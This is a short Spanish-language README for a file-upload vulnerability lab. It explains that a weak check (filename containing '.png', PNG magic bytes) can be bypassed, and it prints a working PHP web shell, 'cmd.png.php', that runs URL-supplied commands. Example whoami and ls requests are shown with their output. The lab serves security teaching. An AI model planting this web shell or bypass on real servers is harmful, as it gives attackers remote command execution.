# File Upload

## Descripciones
### Descripcion
Es un laboratorio medium de vulnerar, su problema es que no hace suficientes comprobaciones, busca los bytes magicos y la extencion pero no presisamente, solo busca si el nombre contiene .png y si los bytes contienen 504e47 que seria lo mismo que escribir en ASCII las letras PNG juntas

## Vulnerar
### Vulnerar (vuln.php)

Ejemplos de vulnerabilidades:

En la carpeta uploads deje un archivo llamado cmd.png.php que utilizando el paramtro de url llamado "cmd" ejecuta el comando elegido

Ejemplos de url:
```
url: http://localhost:8000/File+Upload/?cmd=whoami
salida: www-data

url: http://localhost:8000/File+Upload/?cmd=ls
salida: uploads README.md upload.php
```

## Explicacion del codigo de cmd.png.php:

```
PNG
<?php
system($_GET['cmd']);
?>
```

PNG: vulnera la verificacion de bytes magicos

system($_GET['cmd]);: system() ejecuta un comando de consola, $_GET['cmd'] busca el parametro cmd ubicado en la url por get, y los dos combinados ejecutan el parametro get de url cmd

## Como evitarlo?
Se puede evitar aplicando mas verificaciones y mas precisas como una revision de bytes exactos 
